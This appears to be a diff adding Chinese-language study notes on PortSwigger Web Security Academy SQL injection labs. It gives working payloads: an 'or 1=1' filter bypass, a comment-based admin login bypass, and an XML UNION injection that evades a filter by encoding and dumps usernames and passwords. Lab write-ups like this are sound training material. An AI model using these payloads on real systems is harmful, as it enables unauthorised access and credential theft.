@@ -1,0 +1,44 @@
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+==SQL速查表==
+
+https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+# 注入点为产品表中，where后的产品类别的字符串参数，返回所有产品 #
+类型过滤器文件路径为 /filter?category=Accessories
+修改为 /filter?category=Accessories'+or+1=1--
+
+https://portswigger.net/web-security/sql-injection/lab-login-bypass
+@# 注入点为登录表单的用户名，使用注释绕过密码验证 #@
+在页面的用户名中输入 administrator'--
+post主体内容为 username=administrator%27--&password=0
+
+https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
+# 注入点为商品库存检查功能，使用union并将多列连接为一个字符串，且对此进行混淆编码 #
+在检查商品库存的功能 /product/stock 
+使用post提交xml内容
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>9</productId>
+        <storeId>2</storeId>
+    </stockCheck>
+返回 620 units，如使用union可能仅返回一列
+
+提交如下输入
+<storeId>
+    2 UNION SELECT NULL FROM users
+</storeId>
+返回"Attack detected"， 改为HTML/XML编码则通过，或使用Hackvertor进行混淆编码
+
+在元数据表中查找users表的列名
+UNION SELECT COLUMN_NAME
+FROM INFORMATION_SCHEMA.COLUMNS
+WHERE TABLE_NAME = 'users'
+得到
+email
+password
+620 units
+username
+
+在users表中查找用户名与密码并使用CONCAT_WS连接为一个字符串
+UNION SELECT CONCAT_WS(': ', username, password) 
+FROM users
+得到管理账户密码
